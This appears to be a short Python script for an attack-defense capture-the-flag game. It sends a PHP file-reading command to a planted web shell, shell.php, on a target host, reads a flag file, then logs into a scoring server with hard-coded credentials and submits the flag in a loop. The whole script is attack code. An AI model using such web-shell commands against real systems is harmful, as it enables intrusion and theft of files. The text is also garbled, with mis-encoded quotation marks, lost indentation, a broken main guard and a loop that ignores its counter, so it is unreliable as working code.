import requests

def get_flag(url):
data = {
âcmdâ: âecho file_get_contents("/mydrivers/".scandir("/mydrivers/")[2]);â
}
res = requests.post(url=âhttp://â+url+"/shell.php", data=data)
return url,res.content

def auto_submit(req, ip, flag):
url = âhttp://192.168.80.1/submit_flag.phpâ
headers = {
âUser-Agentâ: âMozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36â
}
data = {
âipâ: ip,
âflagâ: flag
}
res = req.post(url=url, data=data, headers=headers)
print res.content

def login():
url = âhttp://192.168.80.1/login.phpâ
data = {
âusernameâ: âG001â,
âpasswordâ: â123456â
}
req = requests.session()
results = req.post(url=url, data=data)
return req

if name == âmainâ:
logins = login()
for i in range(101,181):
url, flag = get_flag(â192.168.39.150â)
auto_submit(logins, url, flag)